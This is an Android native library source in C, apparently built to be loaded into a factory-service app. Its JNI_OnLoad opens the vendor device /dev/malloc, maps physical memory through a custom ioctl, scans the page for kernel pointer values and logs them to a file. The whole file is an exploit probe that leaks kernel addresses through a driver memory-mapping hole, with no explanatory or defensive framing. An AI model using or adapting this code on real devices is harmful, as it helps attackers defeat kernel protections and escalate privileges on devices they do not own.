typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long long u64;
#define SYS_open 5
#define SYS_ioctl 54
#define SYS_mmap2 192
#define SYS_munmap 91
#define SYS_write 4
#define SYS_close 6
#define SYS_exit 1
static long sc(long n,long a,long b,long c,long d,long e,long f){register long r7 __asm__("r7")=n;register long r0 __asm__("r0")=a;register long r1 __asm__("r1")=b;register long r2 __asm__("r2")=c;register long r3 __asm__("r3")=d;register long r4 __asm__("r4")=e;register long r5 __asm__("r5")=f;__asm__ volatile("svc 0":"+r"(r0):"r"(r7),"r"(r1),"r"(r2),"r"(r3),"r"(r4),"r"(r5):"memory");return r0;}
static long lg=-1; static void put(const char*s){int n=0;while(s[n])n++;if(lg>=0)sc(SYS_write,lg,(long)s,n,0,0,0);}
static void hx(u64 v){char b[19];int i;for(i=0;i<16;i++){int d=(v>>((15-i)*4))&15;b[i]=d<10?48+d:87+d;}b[16]=10;b[17]=0;put(b);}
static void dec(long v){char b[24];int i=23;b[23]=0;if(v==0){put("0");return;}int neg=0;if(v<0){neg=1;v=-v;}while(v){b[--i]=48+v%10;v/=10;}if(neg)b[--i]=45;put(b+i);}
struct info{u64 addr,size,interval;u8 miusel;u8 pad[7];};
static unsigned long mp(long fd,u64 phys,u64 size){struct info in;in.addr=phys-0x20000000ULL;in.size=size;in.interval=0;in.miusel=0;in.pad[0]=0;if(sc(SYS_ioctl,fd,0x80204d04u,(long)&in,0,0,0))return 0;long p=sc(SYS_mmap2,0,size,3,1,fd,0);if((unsigned long)p>=0xfffff000UL)return 0;return p;}
__attribute__((visibility("default"))) int JNI_OnLoad(void*a,void*b){
 lg=sc(SYS_open,(long)"/data/data/com.cvte.factory.service/files/initdump.log",0x241,0644,0,0,0);
 long fd=sc(SYS_open,(long)"/dev/malloc",2,0,0,0,0); put("fd=");dec(fd);put("\n"); if(fd<0)return 0x10006;
 unsigned long p=mp(fd,0x2121a000ULL,0x1000); put("map=");hx(p);put("\n"); if(!p)return 0x10006;
 u64 *q=(u64*)p; int o; for(o=0;o<0x700;o+=8){u64 v=q[o/8]; if(v>=0xffffff8000000000ULL){put("O ");dec(o);put(" ");hx(v);}}
 put("end\n"); sc(SYS_munmap,p,0x1000,0,0,0,0); return 0x10006;
}
